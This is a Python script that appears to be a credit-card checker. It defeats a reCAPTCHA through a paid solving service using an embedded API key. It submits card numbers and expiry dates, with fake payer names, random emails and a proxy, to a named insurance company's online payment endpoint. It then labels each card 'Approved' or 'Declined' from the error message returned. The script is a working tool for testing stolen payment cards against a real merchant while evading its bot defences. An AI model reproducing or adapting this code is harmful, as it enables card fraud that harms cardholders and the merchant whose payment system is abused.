import capsolver
import asyncio
from httpx import AsyncClient
import uuid
from faker import Faker

async def rapidotc(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(verify=False,proxy=proxyg) as web:
        fake = Faker()
        email = f"{uuid.uuid4()}@gmail.com"
        capsolver.api_key = "CAP-19CE2290C6A6349E52AE1488B65DCCB7"
        
        g_response = (await asyncio.to_thread(lambda: capsolver.solve({
        "type": "ReCaptchaV2TaskProxyLess",
        "websiteKey": '6LeDxZwpAAAAAM8huWYzvoKay-WM4B-1JzvM9s_A',
        "websiteURL": 'https://powersinsurance.epaypolicy.com/',
        })))['gRecaptchaResponse']
            
        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'g-recaptcha-response': g_response,
            'origin': 'https://powersinsurance.epaypolicy.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://powersinsurance.epaypolicy.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'paymentModel': {
                'payer': fake.name(),
                'emailaddress': email,
                'amount': '10',
                'comments': 'Insurance',
                'authorize': '',
                'bankAccountHolder': '',
                'routingNumber': '',
                'accountNumber': '',
                'confirmAccountNumber': '',
                'cardAccountHolder': fake.name(),
                'cardNumber': cc,
                'validThrough': f'{mes}/{ano}',
                'cvc': '',
                'postalCode': fake.postcode(),
                'paymentMethod': 'CreditCard',
                'tokenPublicId': None,
                'savePaymentOption': False,
                'fileModels': [],
                'clientNotificationId': None,
                'enableAutoPay': False,
                'startDate': '2024-12-26',
                'numberOfPayments': None,
                'intervalCount': 1,
                'scheduledPaymentsEndOption': 'Never',
                'intervalId': 3,
                'month': mes,
                'year': ano,
                'endDate': None,
            },
            'transactionAttributeValues': {},
            'invoicePayments': [],
        }

        req1 = await web.post('https://powersinsurance.epaypolicy.com/Payments/MakePayment',headers=headers,json=json_data,)
        print(req1.text)
        if "Success:True" in req1.text:
            status = "Approved ✅"
            mensaje = "Chaged $0.01"
        else:
            mensaje = req1.text.split(',"ErrorMessage":"')[1].split('"')[0]
            if "CVC" in mensaje:
                status = "Approved ✅"
            elif "Funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status,mensaje